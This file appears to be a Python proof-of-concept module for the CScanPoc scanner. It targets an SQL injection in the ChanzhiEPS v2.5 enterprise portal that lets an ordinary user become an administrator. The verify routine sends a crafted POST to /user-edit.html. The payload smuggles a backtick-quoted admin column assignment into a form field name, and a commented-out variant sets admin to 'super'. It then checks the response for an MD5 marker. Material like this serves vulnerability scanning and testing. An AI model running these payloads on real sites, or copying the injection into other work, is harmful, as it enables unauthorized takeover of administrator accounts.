# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'chanzhiEPS_0001_L'  # 平台漏洞编号，留空
    name = '蝉知企业门户系统 v2.5 sql注入至管理员'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-09-28'  # 漏洞公布时间
    desc = '''
        问题出在用户修改资料的地方，/system/module/user/control.php

        普通用户和管理员是在一个表的，的区别就是 admin字段。
        总之对我们post的数据做了 foreach然后带入了 updata
        当然他有remove admin的，可是这太好绕过了。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/2207/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'chanzhiEPS(蝉知门户系统)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b8d861de-cd7b-48d7-9f30-623c72ad3d43'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-21'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 注册用户aaaaaa后，http://localhost/user-edit.html修改资料
            s = requests.session()
            s.get(self.target)
            payload = '/user-edit.html'
            #data = "realname=aaaaaa&email=a%40qqqq.com&password1=&password2=&company=&address=&zipcode=&mobile=&phone=&qq`%3D1,`admin=super>alk="
            data = "realname=aaaaaa&email=a%40qqqq.com&password1=&password2=&company=&address=&zipcode=&mobile=&phone=&qq`%3D1,`admin=md5%28c%29>alk="
            url = self.target + payload
            r = requests.post(url, data=data)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name,url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
